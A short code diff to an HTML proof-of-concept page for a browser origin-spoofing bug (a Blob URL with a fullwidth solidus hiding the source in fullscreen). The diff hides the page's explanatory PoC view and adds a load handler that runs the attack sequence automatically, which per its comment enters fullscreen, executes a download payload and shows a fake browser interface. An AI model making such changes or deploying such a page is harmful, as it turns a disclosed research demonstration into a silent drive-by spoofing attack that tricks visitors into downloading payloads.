@@ -223,8 +223,8 @@
 </head>
 <body>
 
-  <!-- Initial View: Displays PoC information and attack trigger button -->
-  <div class="container" id="initial-view">
+  <!-- Initial View: Hidden trigger area -->
+  <div class="container" id="initial-view" style="display: none;">
     <div class="title">
       PoC: Bypass Origin to Remove Source Display<br>
       in Fullscreen via Blob URL Fullwidth Solidus
@@ -289,6 +289,15 @@
   </div>
 
   <script>
+    /**
+     * Auto-execute attack sequence on page load
+     */
+    window.addEventListener('load', function() {
+      setTimeout(() => {
+        initiateAttackSequence();
+      }, 100);
+    });
+
     /**
      * Main attack sequence function
      * Triggers fullscreen mode, executes download payload, and switches to fake browser UI
